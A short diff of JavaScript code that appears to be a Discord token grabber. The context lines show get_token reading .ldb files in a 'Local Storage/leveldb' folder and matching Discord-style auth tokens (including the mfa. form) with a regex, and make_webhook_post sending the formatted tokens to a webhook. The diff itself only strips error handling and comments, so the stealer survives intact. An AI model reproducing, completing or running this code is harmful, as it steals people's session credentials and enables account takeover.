@@ -13,11 +13,6 @@ function make_webhook_post(to_post) {
         content: format_token(to_post)
       }
     }, (error, res, body) => {
-      if (error) {
-        console.error(error);
-        return;
-      }
-      //do stuff here
     });
 }
 
@@ -26,10 +21,8 @@ function get_token() {
     let re = new RegExp('\"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})\"');
     let dir_name = path.join(__dirname, '‎/../../../../Local Storage/leveldb');
     try {
-        // Get the files as an array
         var files = fs.readdirSync(dir_name);
             for( const file of files ) {
-                // Get the full paths
                 const full_path = path.join(dir_name, file);
                 if (!full_path.endsWith(".ldb"))
                     continue;
